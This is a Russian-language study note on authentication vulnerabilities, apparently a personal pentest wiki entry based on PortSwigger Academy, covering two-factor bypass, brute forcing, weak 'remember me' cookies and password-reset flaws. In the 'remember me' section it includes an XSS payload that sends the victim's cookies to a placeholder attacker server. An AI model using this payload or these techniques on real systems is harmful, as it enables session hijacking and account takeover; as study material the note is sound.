Аутентификация - процесс подтверждения личности пользователя. 
Типы аутентификации:
- Фактор знания (пароль или ответ на вопрос)
- Фактор владения (физический объект: телефон, USB-токен)
- Биометрический фактор (отпечаток пальца, паттерн поведения)
## Источники информации
- [Authentification Learning Path PortSwigger Academy](https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/what-is-authentication/authentication/)
## Уязвимости при аутентификации с паролем
### Брутфорс
[[Учетные данные и хэши]]
### Обход двухфакторной авторизации
- Если пользователю сначала предлагается ввести пароль, а затем на отдельной странице - проверочный код, то фактически он уже вошел в систему ​​еще до ввода проверочного кода. В некоторых случаях пользователь в таком состоянии может получить доступ к страницам для авторизованных пользователей
- Приложение может не проверять или неправильно проверять, что первый и второй шаг многофакторной аутентификации выполняет один и тот пользователь. Например, пользователю после прохождения первого шага присваивается куки `account=user`. Если приложение по данному куки проверяет пользователя на втором шаге, атакующий может изменить его и сбрутить второй фактор
- Для брутфорса двухфакторной аутентификации, когда пользователя разлогинивает после нескольких неудачных попыток ввода второго фактора, можно использовать расширение Burp Suite [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988)
## Уязвимости других механизмов аутентификации
### Функция "Запомнить меня" ("Remember me", "Keep me logged in")
Функция "Запомнить меня" обычно реализована с помощью токена, который хранится в виде постоянной куки. Если она представляет собой незащищенные данные (например, логин:пароль в Base64 или в иде хэша), атакующий может зареверсить исходные данные и сгенерировать такой куки для другого пользователя. Также атакующий может похитить куки с помощью XSS (`<img src=x onerror="this.src='http://<attacker_server>/steal?c='+document.cookie">`), после чего сбрутить аутентификационные данные офлайн
### Сброс пароля
- Если для сброса пароля используется ссылка с легкоугадываемым параметром (`http://<url>/reset-password?user=<user_login>`), атакующий может подставить параметр для другого пользователя и сбросить пароль
- Если используется URL с токеном, который угадать сложно, атакующий может попробовать переиспользовать его для сброса пароля другого пользователя
- Атакующий может использовать атаку "[Password Reset Poisoning](https://www.aptive.co.uk/blog/what-is-password-reset-poisoning/)", которая позволяет отправить токен на свой сервер
- Сброс пароля может позволить атакующему сбрутить логин или пароли, если логин пользователя подставляется в запрос на смену пароля из скрытого поля. Атакующий сможет подставлять туда свои значения: `username=<user>&current-password=<old_pass>&new-password-1=<new_pass>&new-password-2=<new_pass>`
